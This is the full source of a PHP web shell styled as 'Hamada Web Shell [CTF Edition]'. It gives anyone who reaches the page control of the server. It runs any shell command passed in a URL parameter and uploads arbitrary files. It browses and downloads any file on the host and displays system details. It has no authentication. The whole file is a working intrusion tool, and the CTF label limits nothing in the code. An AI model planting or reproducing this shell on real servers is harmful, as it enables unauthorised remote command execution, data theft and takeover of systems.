<?php
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

function printPerms($file) {
    $mode = fileperms($file);
    if( $mode & 0x1000 ) { $type='p'; }
    else if( $mode & 0x2000 ) { $type='c'; }
    else if( $mode & 0x4000 ) { $type='d'; }
    else if( $mode & 0x6000 ) { $type='b'; }
    else if( $mode & 0x8000 ) { $type='-'; }
    else if( $mode & 0xA000 ) { $type='l'; }
    else if( $mode & 0xC000 ) { $type='s'; }
    else $type='u';
    $owner["read"] = ($mode & 00400) ? 'r' : '-';
    $owner["write"] = ($mode & 00200) ? 'w' : '-';
    $owner["execute"] = ($mode & 00100) ? 'x' : '-';
    $group["read"] = ($mode & 00040) ? 'r' : '-';
    $group["write"] = ($mode & 00020) ? 'w' : '-';
    $group["execute"] = ($mode & 00010) ? 'x' : '-';
    $world["read"] = ($mode & 00004) ? 'r' : '-';
    $world["write"] = ($mode & 00002) ? 'w' : '-';
    $world["execute"] = ($mode & 00001) ? 'x' : '-';
    if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
    if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
    if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
    $s=sprintf("%1s", $type);
    $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
    $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
    $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
    return $s;
}

$dir = $_GET['dir'] ?? $_POST['dir'] ?? './';
if (!is_dir($dir)) {
    $dir = is_file($dir) ? dirname($dir) : './';
}
$dir = realpath($dir);
$dirs = scandir($dir);

// Get system information
$uname = function_exists('php_uname') ? php_uname() : 'Unknown';
$system_info = [
    'System' => $uname,
    'PHP Version' => phpversion(),
    'User' => get_current_user(),
    'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
    'Your IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hamada Web Shell</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
        
        :root {
            --primary: #00ff00;
            --bg-dark: #0a0a0a;
            --bg-darker: #050505;
            --text: #e0e0e0;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'JetBrains Mono', monospace;
        }
        
        body {
            background: var(--bg-dark);
            color: var(--text);
            line-height: 1.6;
        }
        
        .container {
            width: 95%;
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: var(--bg-darker);
            border: 1px solid var(--primary);
            border-radius: 8px;
        }
        
        .title {
            color: var(--primary);
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px var(--primary);
        }
        
        .subtitle {
            color: #888;
            font-size: 1.2em;
        }
        
        .panel {
            background: var(--bg-darker);
            border: 1px solid var(--primary);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .panel-title {
            color: var(--primary);
            font-size: 1.2em;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }
        
        .system-info-item {
            display: flex;
            gap: 10px;
        }
        
        .system-info-label {
            color: var(--primary);
        }
        
        .cmd-form {
            display: flex;
            gap: 10px;
        }
        
        .cmd-input {
            flex: 1;
            background: var(--bg-dark);
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 10px 15px;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .btn {
            background: var(--primary);
            color: var(--bg-dark);
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: opacity 0.3s;
        }
        
        .btn:hover {
            opacity: 0.8;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        
        .file-table th {
            background: var(--bg-dark);
            color: var(--primary);
            text-align: left;
            padding: 12px;
            font-weight: normal;
        }
        
        .file-table td {
            padding: 12px;
            border-top: 1px solid #333;
        }
        
        .file-table tr:hover {
            background: rgba(0, 255, 0, 0.05);
        }
        
        .file-link {
            color: var(--text);
            text-decoration: none;
        }
        
        .file-link:hover {
            color: var(--primary);
        }
        
        .folder-link {
            color: var(--primary);
            text-decoration: none;
        }
        
        .folder-link:hover {
            text-shadow: 0 0 5px var(--primary);
        }
        
        .output {
            background: var(--bg-dark);
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
            color: var(--primary);
        }
        
        .success {
            color: var(--primary);
        }
        
        .error {
            color: #ff4444;
        }

        .upload-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .file-input {
            flex: 1;
            background: var(--bg-dark);
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 8px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">Hamada Web Shell</h1>
            <p class="subtitle">[CTF Edition]</p>
        </div>

        <div class="panel">
            <h2 class="panel-title">
                <i class="fas fa-info-circle"></i>
                System Information
            </h2>
            <div class="system-info">
                <?php foreach($system_info as $key => $value): ?>
                <div class="system-info-item">
                    <span class="system-info-label"><?php echo $key; ?>:</span>
                    <span><?php echo htmlspecialchars($value); ?></span>
                </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="panel">
            <h2 class="panel-title">
                <i class="fas fa-terminal"></i>
                Command Execution
            </h2>
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="GET" class="cmd-form">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                <input type="text" name="cmd" class="cmd-input" placeholder="Enter command..." autocomplete="off" autofocus>
                <button type="submit" class="btn">Execute</button>
            </form>
            
            <?php if (isset($_GET['cmd'])): ?>
            <div class="panel" style="margin-top: 15px;">
                <h3 class="panel-title">Output</h3>
                <pre class="output"><?php
                    $cmdresult = [];
                    exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
                    echo htmlspecialchars(implode("\n", $cmdresult));
                ?></pre>
            </div>
            <?php endif; ?>
        </div>

        <div class="panel">
            <h2 class="panel-title">
                <i class="fas fa-upload"></i>
                File Upload
            </h2>
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" enctype="multipart/form-data" class="upload-form">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($_GET['dir'] ?? ''); ?>">
                <input type="file" name="fileToUpload" class="file-input">
                <button type="submit" name="submit" class="btn">Upload</button>
            </form>
            
            <?php if (isset($_POST['submit'])): ?>
            <div style="margin-top: 15px;">
                <?php
                $uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
                if (file_exists($uploadDirectory)) {
                    echo '<div class="error">Error: File already exists!</div>';
                } else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
                    echo '<div class="success">File uploaded successfully!</div>';
                } else {
                    echo '<div class="error">Error uploading file!</div>';
                }
                ?>
            </div>
            <?php endif; ?>
        </div>

        <div class="panel">
            <h2 class="panel-title">
                <i class="fas fa-folder-open"></i>
                File Browser
            </h2>
            <div style="margin-bottom: 15px;">
                Current Directory: <?php echo htmlspecialchars($dir); ?>
            </div>
            <div style="overflow-x: auto;">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Name</th>
                            <th>Owner</th>
                            <th>Permissions</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($dirs as $value): 
                            $fullPath = realpath($dir.'/'.$value);
                            $isDir = is_dir($fullPath);
                            $icon = $isDir ? 'fa-folder' : 'fa-file-code';
                        ?>
                        <tr>
                            <td><i class="fas <?php echo $icon; ?>"></i></td>
                            <td>
                                <?php if ($isDir): ?>
                                    <a href="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($fullPath); ?>" 
                                       class="folder-link"><?php echo htmlspecialchars($value); ?></a>
                                <?php else: ?>
                                    <a href="<?php echo $_SERVER['PHP_SELF'].'?download='.urlencode($fullPath); ?>" 
                                       class="file-link"><?php echo htmlspecialchars($value); ?></a>
                                <?php endif; ?>
                            </td>
                            <td><?php echo htmlspecialchars(posix_getpwuid(fileowner($fullPath))['name']); ?></td>
                            <td><?php echo htmlspecialchars(printPerms($fullPath)); ?></td>
                            <td>
                                <?php if (!$isDir): ?>
                                    <a href="<?php echo $_SERVER['PHP_SELF'].'?download='.urlencode($fullPath); ?>" 
                                       class="file-link">
                                        <i class="fas fa-download"></i> Download
                                    </a>
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>
